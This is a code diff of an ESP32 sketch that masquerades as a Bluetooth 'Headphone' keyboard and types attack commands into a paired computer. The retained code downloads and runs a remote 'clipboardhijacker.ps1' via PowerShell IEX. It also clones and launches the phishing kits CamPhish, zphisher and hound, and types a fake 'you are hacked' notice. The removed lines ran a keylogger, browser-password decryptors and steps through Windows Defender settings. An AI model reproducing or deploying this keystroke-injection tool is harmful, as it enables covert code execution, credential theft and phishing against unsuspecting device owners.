@@ -1,5 +1,3 @@
-// This program created by Sachin Kumar Pandey
-// ESP32 BLE HID
 #include <BleKeyboard.h>
 
 #define BUTTON_1_PIN 16 // Trigger 1
@@ -11,28 +9,16 @@
 #define BUTTON_7_PIN 13 // Trigger 7
 #define BUTTON_8_PIN 12 // Trigger 8
 #define BUTTON_9_PIN 14 // Trigger 9
-#define BUTTON_10_PIN 23  // Trigger 10
-#define BUTTON_11_PIN 24  // Trigger 11
-#define BUTTON_12_PIN 26  // Trigger 12
-#define BUTTON_13_PIN 28  // Trigger 13
-#define BUTTON_14_PIN 25  // Trigger 14
-#define BUTTON_15_PIN 22  // Trigger 15
-#define BUTTON_16_PIN 11  // Trigger 16
-#define BUTTON_17_PIN 27  // Trigger 17
-#define BUTTON_18_PIN 20  // Trigger 18
-#define BUTTON_19_PIN 29  // Trigger 19
-#define BUTTON_20_PIN 30  // Trigger 20
-#define BUTTON_21_PIN 31  // Trigger 21
-#define BUTTON_22_PIN 32  // Trigger 22
-#define BUTTON_23_PIN 33  // Trigger 23
-#define BUTTON_24_PIN 34  // Trigger 24
-#define BUTTON_25_PIN 10  // Trigger 25
-#define BUTTON_26_PIN 35  // Trigger 26
+#define BUTTON_10_PIN 23 // Trigger 10
+#define BUTTON_11_PIN 33 // Trigger 11
+#define BUTTON_12_PIN 26 // Trigger 12
+#define BUTTON_13_PIN 27 // Trigger 13
+#define BUTTON_14_PIN 25 // Trigger 14
+#define BUTTON_15_PIN 22 // Trigger 15
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
 
-// last-state trackers
 bool lastState1 = HIGH;
 bool lastState2 = HIGH;
 bool lastState3 = HIGH;
@@ -48,19 +34,7 @@ bool lastState12 = HIGH;
 bool lastState13 = HIGH;
 bool lastState14 = HIGH;
 bool lastState15 = HIGH;
-bool lastState16 = HIGH;
-bool lastState17 = HIGH;
-bool lastState18 = HIGH;
-bool lastState19 = HIGH;
-bool lastState20 = HIGH;
-bool lastState21 = HIGH;
-bool lastState22 = HIGH;
-bool lastState23 = HIGH;
-bool lastState24 = HIGH;
-bool lastState25 = HIGH;
-bool lastState26 = HIGH;
 
-// helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
     bleKeyboard.print(s[i]);
@@ -68,11 +42,10 @@ void sendString(const char* s, int charDelay = 10) {
   }
 }
 
-// Helper: slow typing function
-void sendStringSlow(const char *s, unsigned long charDelayMs = 120) {
+void sendStringSlow(const char* s, unsigned long charDelayMs = 120) {
   for (size_t i = 0; s[i] != '\0'; ++i) {
-    bleKeyboard.print(s[i]);   // send single character
-    delay(charDelayMs);        // wait so the host processes each char
+    bleKeyboard.print(s[i]);
+    delay(charDelayMs);
   }
 }
 
@@ -86,6 +59,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
+  Serial.println("Starting BLE HID setup...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -102,23 +76,17 @@ void setup() {
   pinMode(BUTTON_13_PIN, INPUT_PULLUP);
   pinMode(BUTTON_14_PIN, INPUT_PULLUP);
   pinMode(BUTTON_15_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_16_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_17_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_18_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_19_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_20_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_21_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_22_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_23_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_24_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_25_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_26_PIN, INPUT_PULLUP);
 
+  Serial.println("Initializing BLE...");
+  delay(1000); // Added delay for stable BLE initialization
   bleKeyboard.begin();
+  Serial.println("BLE initialization attempted. Check if 'Headphone' appears on host device.");
+  Serial.println("Setup complete!");
 }
 
 void loop() {
   if (bleKeyboard.isConnected()) {
+    Serial.println("BLE connected!");
     bool state1 = digitalRead(BUTTON_1_PIN);
     bool state2 = digitalRead(BUTTON_2_PIN);
     bool state3 = digitalRead(BUTTON_3_PIN);
@@ -134,19 +102,8 @@ void loop() {
     bool state13 = digitalRead(BUTTON_13_PIN);
     bool state14 = digitalRead(BUTTON_14_PIN);
     bool state15 = digitalRead(BUTTON_15_PIN);
-    bool state16 = digitalRead(BUTTON_16_PIN);
-    bool state17 = digitalRead(BUTTON_17_PIN);
-    bool state18 = digitalRead(BUTTON_18_PIN);
-    bool state19 = digitalRead(BUTTON_19_PIN);
-    bool state20 = digitalRead(BUTTON_20_PIN);
-    bool state21 = digitalRead(BUTTON_21_PIN);
-    bool state22 = digitalRead(BUTTON_22_PIN);
-    bool state23 = digitalRead(BUTTON_23_PIN);
-    bool state24 = digitalRead(BUTTON_24_PIN);
-    bool state25 = digitalRead(BUTTON_25_PIN);
-    bool state26 = digitalRead(BUTTON_26_PIN);
 
-    // Trigger 1:
+    // Trigger 1: Open Notepad and type a message
     if (lastState1 == HIGH && state1 == LOW) {
       Serial.println("Trigger 1 is running");
       openRun();
@@ -157,27 +114,24 @@ void loop() {
       delay(100);
       bleKeyboard.releaseAll();
       delay(800);
-
       const char* txt = "Hello From ESP32 - This program created by Sachin Kumar Pandey";
       sendString(txt, 50);
       delay(200);
     }
 
-    // Trigger 2:
+    // Trigger 2: Open Windows Terminal and run curl parrot.live
     if (lastState2 == HIGH && state2 == LOW) {
+      Serial.println("Trigger 2 is running");
       openRun();
       delay(500);
-      sendString("wt"); // looks like you intended Windows Terminal ("wt")
+      sendString("wt");
       delay(100);
-      // Ctrl+Shift+Enter to run as admin (may show UAC)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_SHIFT);
       bleKeyboard.press(KEY_RETURN);
       delay(120);
       bleKeyboard.releaseAll();
       delay(3000);
-
-      // navigate and run; your original sequence used LEFT_ARROW etc.
       bleKeyboard.press(KEY_LEFT_ARROW);
       delay(100);
       bleKeyboard.releaseAll();
@@ -186,7 +140,6 @@ void loop() {
       delay(100);
       bleKeyboard.releaseAll();
       delay(2000);
-
       const char* cmd = "color 2 & curl parrot.live";
       sendString(cmd, 50);
       delay(500);
@@ -196,8 +149,9 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 3:
+    // Trigger 3: Open browser with resume URL
     if (lastState3 == HIGH && state3 == LOW) {
+      Serial.println("Trigger 3 is running");
       openRun();
       delay(700);
       const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
@@ -209,8 +163,9 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 4:
+    // Trigger 4: Open CMD and run ipconfig /all
     if (lastState4 == HIGH && state4 == LOW) {
+      Serial.println("Trigger 4 is running");
       openRun();
       delay(300);
       const char* cmd = "cmd";
@@ -220,7 +175,6 @@ void loop() {
       delay(300);
       bleKeyboard.releaseAll();
       delay(700);
-
       const char* action = "ipconfig /all";
       sendString(action, 10);
       delay(200);
@@ -230,11 +184,11 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 5:
+    // Trigger 5: Open browser with GitHub URL
     if (lastState5 == HIGH && state5 == LOW) {
+      Serial.println("Trigger 5 is running");
       openRun();
       delay(500);
-
       const char* url = "https://github.com/sachinpandey7709";
       sendString(url, 10);
       delay(300);
@@ -244,8 +198,9 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 6:
+    // Trigger 6: Open CMD and cycle through colors
     if (lastState6 == HIGH && state6 == LOW) {
+      Serial.println("Trigger 6 is running");
       openRun();
       delay(400);
       sendString("cmd", 10);
@@ -254,28 +209,24 @@ void loop() {
       delay(300);
       bleKeyboard.releaseAll();
       delay(700);
-      sendString("color a", 10); // foreground bright green
+      sendString("color a", 10);
       delay(100);
       bleKeyboard.press(KEY_RETURN);
       delay(200);
       bleKeyboard.releaseAll();
       delay(700);
-
-      sendString("color 1", 10); // foreground blue
+      sendString("color 1", 10);
       delay(100);
       bleKeyboard.press(KEY_RETURN);
       delay(200);
       bleKeyboard.releaseAll();
       delay(700);
-
-      sendString("color 2", 10); // foreground green
+      sendString("color 2", 10);
       delay(100);
       bleKeyboard.press(KEY_RETURN);
       delay(200);
       bleKeyboard.releaseAll();
       delay(700);
-
-      // exit cmd
       sendString("exit", 10);
       delay(100);
       bleKeyboard.press(KEY_RETURN);
@@ -284,21 +235,19 @@ void loop() {
       delay(500);
     }
 
-    // Trigger 7:
+    // Trigger 7: Open Windows Terminal and run curl ascii.live/forrest
     if (lastState7 == HIGH && state7 == LOW) {
+      Serial.println("Trigger 7 is running");
       openRun();
       delay(500);
-      sendString("wt"); // looks like you intended Windows Terminal ("wt")
+      sendString("wt");
       delay(100);
-      // Ctrl+Shift+Enter to run as admin (may show UAC)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_SHIFT);
       bleKeyboard.press(KEY_RETURN);
       delay(120);
       bleKeyboard.releaseAll();
       delay(3000);
-
-      // navigate and run; your original sequence used LEFT_ARROW etc.
       bleKeyboard.press(KEY_LEFT_ARROW);
       delay(100);
       bleKeyboard.releaseAll();
@@ -307,7 +256,6 @@ void loop() {
       delay(100);
       bleKeyboard.releaseAll();
       delay(2000);
-
       const char* cmd = "color 2 & curl ascii.live/forrest";
       sendString(cmd, 50);
       delay(500);
@@ -317,21 +265,19 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 8:
+    // Trigger 8: Open Windows Terminal and run curl ascii.live/donut
     if (lastState8 == HIGH && state8 == LOW) {
+      Serial.println("Trigger 8 is running");
       openRun();
       delay(500);
-      sendString("wt"); // looks like you intended Windows Terminal ("wt")
+      sendString("wt");
       delay(100);
-      // Ctrl+Shift+Enter to run as admin (may show UAC)
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_SHIFT);
       bleKeyboard.press(KEY_RETURN);
       delay(120);
       bleKeyboard.releaseAll();
       delay(3000);
-
-      // navigate and run; your original sequence used LEFT_ARROW etc.
       bleKeyboard.press(KEY_LEFT_ARROW);
       delay(100);
       bleKeyboard.releaseAll();
@@ -340,7 +286,6 @@ void loop() {
       delay(100);
       bleKeyboard.releaseAll();
       delay(2000);
-
       const char* cmd = "color 2 & curl ascii.live/donut";
       sendString(cmd, 50);
       delay(500);
@@ -350,57 +295,37 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 9
+    // Trigger 9: Open Notepad and type a message
     if (lastState9 == HIGH && state9 == LOW) {
-      if (bleKeyboard.isConnected()) {
-        // Open Run dialog (Win + R)
-        bleKeyboard.press(KEY_LEFT_GUI);
-        bleKeyboard.press('r');
-        delay(100);
-        bleKeyboard.releaseAll();
-        delay(1000);
-
-        // Launch Notepad
-        const char* cmd = "notepad";
-        for (int i = 0; i < strlen(cmd); i++) {
-          bleKeyboard.print(cmd[i]);
-          delay(10);
-        }
-        delay(500);
-        bleKeyboard.press(KEY_RETURN);
-        delay(100);
-        bleKeyboard.releaseAll();
-        delay(900); // wait for Notepad to open
-
-        const char* txt = "You are hacked by black hat hackers. You are in my control.";
-        for (int i = 0; i < strlen(txt); i++) {
-          bleKeyboard.print(txt[i]);
-          delay(12);
-        }
-        delay(300);
-
-        // Open File menu (Alt + F)
-        bleKeyboard.press(KEY_LEFT_ALT);
-        bleKeyboard.press('f');
-        delay(100);
-        bleKeyboard.releaseAll();
-        
-        // Wait 300 ms then press 'x' (File -> Exit)
-        delay(300);
-        bleKeyboard.press('x');
-        delay(100);
-        bleKeyboard.releaseAll();
-      }
-    }
-
-    // Trigger 10:
-      if (lastState10 == HIGH && state10 == LOW) {
-      bleKeyboard.press(KEY_LEFT_GUI);
-      bleKeyboard.press('r');
+      Serial.println("Trigger 9 is running");
+      openRun();
+      delay(1000);
+      const char* cmd = "notepad";
+      sendString(cmd, 10);
+      delay(500);
+      bleKeyboard.press(KEY_RETURN);
       delay(100);
       bleKeyboard.releaseAll();
+      delay(900);
+      const char* txt = "You are hacked by black hat hackers. You are in my control.";
+      sendString(txt, 12);
+      delay(300);
+      bleKeyboard.press(KEY_LEFT_ALT);
+      bleKeyboard.press('f');
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(300);
+      bleKeyboard.press('x');
+      delay(100);
+      bleKeyboard.releaseAll();
+    }
+
+    // Trigger 10: Open Windows Terminal and run a PowerShell script (ETHICAL WARNING)
+    if (lastState10 == HIGH && state10 == LOW) {
+      Serial.println("Trigger 10 is running (WARNING: Potentially malicious)");
+      openRun();
       delay(1000);
-      bleKeyboard.print("wt");
+      sendString("wt");
       delay(100);
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_SHIFT);
@@ -417,18 +342,17 @@ void loop() {
       bleKeyboard.releaseAll();
       delay(5000);
       const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8081/clipboardhijacker.ps1')";
-      for (int i=0; i < strlen(cmd); i++) {
-      bleKeyboard.print(cmd[i]);
-      delay(50);
-      }
+      sendString(cmd, 50);
       delay(1000);
       bleKeyboard.press(KEY_RETURN);
       delay(100);
       bleKeyboard.releaseAll();
       delay(1000);
-      }
-    // Trigger 11
+    }
+
+    // Trigger 11: Open browser with YouTube URL
     if (lastState11 == HIGH && state11 == LOW) {
+      Serial.println("Trigger 11 is running");
       openRun();
       delay(700);
       const char* url = "https://youtube.com/@sachinautocad954?si=BuLuBVeXN-xsGonl";
@@ -440,21 +364,19 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 12
+    // Trigger 12: Open Chrome in Windows Terminal and load resume URL
     if (lastState12 == HIGH && state12 == LOW) {
+      Serial.println("Trigger 12 is running");
       openRun();
       delay(500);
       sendString("chrome");
       delay(100);
-      
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_SHIFT);
       bleKeyboard.press(KEY_RETURN);
       delay(120);
       bleKeyboard.releaseAll();
       delay(3000);
-
-      
       bleKeyboard.press(KEY_LEFT_ARROW);
       delay(100);
       bleKeyboard.releaseAll();
@@ -463,7 +385,6 @@ void loop() {
       delay(100);
       bleKeyboard.releaseAll();
       delay(2000);
-
       const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
       sendString(url, 10);
       delay(300);
@@ -473,409 +394,76 @@ void loop() {
       delay(1000);
     }
 
-    // Trigger 13:
+    // Trigger 13: Clone and run CamPhish script
     if (lastState13 == HIGH && state13 == LOW) {
-      Serial.println("Trigger 13: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
+      Serial.println("Trigger 13 is running");
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
       delay(120);
       bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
+      delay(700);
       sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 180);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
+      delay(6000);
       sendStringSlow("cd CamPhish", 130);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
-
-      // run script
       sendStringSlow("bash camphish.sh", 130);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
-    // Trigger 14:
+    // Trigger 14: Clone and run zphisher script
     if (lastState14 == HIGH && state14 == LOW) {
-      Serial.println("Trigger 14: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
+      Serial.println("Trigger 14 is running");
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
       delay(120);
       bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
+      delay(700);
       sendStringSlow("git clone --depth=1 https://github.com/htr-tech/zphisher.git", 160);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
+      delay(6000);
       sendStringSlow("cd zphisher", 130);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
-
-      // run script
       sendStringSlow("bash zphisher.sh", 130);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
-    // Trigger 15:
+    // Trigger 15: Clone and run hound script
     if (lastState15 == HIGH && state15 == LOW) {
-      Serial.println("Trigger 15: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
+      Serial.println("Trigger 15 is running");
       bleKeyboard.press(KEY_LEFT_CTRL);
       bleKeyboard.press(KEY_LEFT_ALT);
       bleKeyboard.press('t');
       delay(120);
       bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
+      delay(700);
       sendStringSlow("git clone https://github.com/techchipnet/hound", 160);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
+      delay(6000);
       sendStringSlow("cd hound", 150);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(800);
-
-      // run script
       sendStringSlow("bash hound.sh", 150);
       delay(3000);
       bleKeyboard.press(KEY_RETURN);
       delay(1000);
     }
 
-    // Trigger 16:
-    if (lastState16 == HIGH && state16 == LOW) {
-      Serial.println("Trigger 16: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
-      bleKeyboard.press(KEY_LEFT_CTRL);
-      bleKeyboard.press(KEY_LEFT_ALT);
-      bleKeyboard.press('t');
-      delay(120);
-      bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 200);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
-      sendStringSlow("cd File-Encryption-Awareness-Project-Ethical-Demo-", 160);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(800);
-
-      // run script
-      sendStringSlow("python3 code.py", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-    }
-
-    // Trigger 17:
-    if (lastState17 == HIGH && state17 == LOW) {
-      Serial.println("Trigger 17: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
-      bleKeyboard.press(KEY_LEFT_CTRL);
-      bleKeyboard.press(KEY_LEFT_ALT);
-      bleKeyboard.press('t');
-      delay(120);
-      bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/sachinpandey7709/Keylogger.git", 140);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
-      sendStringSlow("cd Keylogger", 120);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(800);
-
-      // run script
-      sendStringSlow("python3 keylogger.py", 120);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-    }
-
-    // Trigger 18:
-    if (lastState18 == HIGH && state18 == LOW) {
-      Serial.println("Trigger 18: clone repo and run script");
-
-      // Open start / Windows menu
-      bleKeyboard.press(KEY_LEFT_GUI);
-      delay(100);
-      bleKeyboard.releaseAll();
-      delay(500);
-
-      // type "virus & threat protection"
-      bleKeyboard.print("virus & threat protection");
-      delay(7000);
-      bleKeyboard.releaseAll();
-
-      // press TAB 4 times
-      for (int i = 0; i < 4; ++i) {
-        bleKeyboard.press(KEY_TAB);
-        delay(100);
-        bleKeyboard.releaseAll();
-        delay(700);
-      }
-
-      // press ENTER
-      bleKeyboard.press(KEY_RETURN);
-      delay(100);
-      bleKeyboard.releaseAll();
-      delay(1000);
-
-      // === Press SPACE ===
-      bleKeyboard.press(' ');
-      delay(100);
-      bleKeyboard.release(' '); 
-      delay(2000);
-
-      // move left, then press enter
-      bleKeyboard.press(KEY_LEFT_ARROW);
-      delay(100);
-      bleKeyboard.releaseAll();
-      delay(100);
-      bleKeyboard.press(KEY_RETURN);
-      delay(100);
-      bleKeyboard.releaseAll();
-      delay(5000);
-      }
-
-      // Trigger 19:
-    if (lastState19 == HIGH && state19 == LOW) {
-      Serial.println("Trigger 19: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
-      bleKeyboard.press(KEY_LEFT_CTRL);
-      bleKeyboard.press(KEY_LEFT_ALT);
-      bleKeyboard.press('t');
-      delay(120);
-      bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 180);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
-      sendStringSlow("cd Secret-Messaging", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(800);
-
-      // run script
-      sendStringSlow("python3 code2.py", 140);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-    }
-
-    // Trigger 20:
-    if (lastState20 == HIGH && state20 == LOW) {
-      Serial.println("Trigger 20: clone repo and run script (slow typing)");
-
-      // Open terminal (Ctrl+Alt+T)
-      bleKeyboard.press(KEY_LEFT_CTRL);
-      bleKeyboard.press(KEY_LEFT_ALT);
-      bleKeyboard.press('t');
-      delay(120);
-      bleKeyboard.releaseAll();
-      delay(700); // let terminal open
-
-      // Git clone (type slowly)
-      sendStringSlow("git clone https://github.com/sachinpandey7709/Password-Manager.git", 180);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000); // wait for clone to complete (increase if slow internet)
-
-      // cd into folder
-      sendStringSlow("cd Password-Manager", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(800);
-
-      // run script
-      sendStringSlow("python3 password.py", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-    }
-
-    // Trigger 21:
-      if (lastState21 == HIGH && state21 == LOW) {
-      bleKeyboard.press(KEY_LEFT_GUI);
-      bleKeyboard.press('r');
-      delay(1000);
-      bleKeyboard.releaseAll();
-      delay(1000);
-      bleKeyboard.print("powershell");
-      delay(5000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-      sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1200);
-      sendStringSlow("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 200);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000);
-      sendStringSlow("cd decrypt-chrome-passwords", 180);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1200);
-      sendStringSlow("python decrypt_chrome_password.py", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-    }
-
-    // Trigger 22:
-      if (lastState22 == HIGH && state22 == LOW) {
-      bleKeyboard.press(KEY_LEFT_GUI);
-      bleKeyboard.press('r');
-      delay(1000);
-      bleKeyboard.releaseAll();
-      delay(1000);
-      bleKeyboard.print("powershell");
-      delay(5000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-      sendStringSlow("cd C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop", 220);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1200);
-      sendStringSlow("git clone https://github.com/unode/firefox_decrypt.git", 200);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(6000);
-      sendStringSlow("cd firefox_decrypt", 180);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN); 
-      delay(1200);
-      sendStringSlow("python firefox_decrypt.py", 150);
-      delay(3000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-      bleKeyboard.print("2");
-      delay(5000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      bleKeyboard.releaseAll(); 
-    }
-
-    // Trigger 23:
-      if (lastState23 == HIGH && state23 == LOW) {
-      bleKeyboard.press(KEY_LEFT_GUI);
-      bleKeyboard.press('r');
-      delay(1000);
-      bleKeyboard.releaseAll();
-      delay(1000);
-      bleKeyboard.print("cmd");
-      delay(5000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(1000);
-      sendStringSlow("start https://sachinpandey7709.github.io/Resume-Design/", 220);
-      delay(4000);
-      bleKeyboard.press(KEY_RETURN);
-      delay(500);
-      bleKeyboard.releaseAll(); 
-    }
-
-    // Trigger 24:
-    if (lastState24 == HIGH && state24 == LOW) {
-        // Press Win + L
-        bleKeyboard.press(KEY_LEFT_GUI);
-        bleKeyboard.press('l');
-        delay(100);
-        bleKeyboard.releaseAll(); // Release both keys
-    }
-
-    // Trigger 25:
-    if (lastState25 == HIGH && state25 == LOW) {
-    bleKeyboard.press(KEY_LEFT_GUI);
-    bleKeyboard.press('x');
-    delay(200);
-    bleKeyboard.releaseAll();
-
-    delay(500);
-    bleKeyboard.write('u');
-    delay(200);
-    bleKeyboard.write('u');
-    }
-
-    // Trigger 26:
-    if (lastState26 == HIGH && state26 == LOW) {
-
-    // 1: Press Enter
-    bleKeyboard.press(KEY_RETURN);
-    delay(300);
-
-    // 2: Type "sachin"
-    bleKeyboard.print("sachin");
-    delay(300);
-
-    // 3: Press Enter
-    bleKeyboard.press(KEY_RETURN);
-    delay(500);
-
-    // 4: Press Windows key (to open Start menu)
-    bleKeyboard.press(KEY_LEFT_GUI);
-    delay(100);
-    bleKeyboard.releaseAll();
-    delay(500);
-
-    // 5: Type "cmd"
-    bleKeyboard.print("cmd");
-    delay(300);
-
-    // 6: Press Enter (open Command Prompt)
-    bleKeyboard.press(KEY_RETURN);
-    delay(1000); // wait for cmd to open
-
-    // 7: Type start command with GitHub link
-    sendStringSlow("start https://github.com/sachinpandey7709", 180);
-    delay(300);
-
-    // 8: Press Enter
-    bleKeyboard.press(KEY_RETURN);
-    }
-
-    // update last states
+    // Update last states
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -891,18 +479,9 @@ void loop() {
     lastState13 = state13;
     lastState14 = state14;
     lastState15 = state15;
-    lastState16 = state16;
-    lastState17 = state17;
-    lastState18 = state18;
-    lastState19 = state19;
-    lastState20 = state20;
-    lastState21 = state21;
-    lastState22 = state22;
-    lastState23 = state23;
-    lastState24 = state24;
-    lastState25 = state25;
-    lastState26 = state26;
+  } else {
+    Serial.println("Waiting for BLE connection...");
   }
 
   delay(10);
-  }
+}
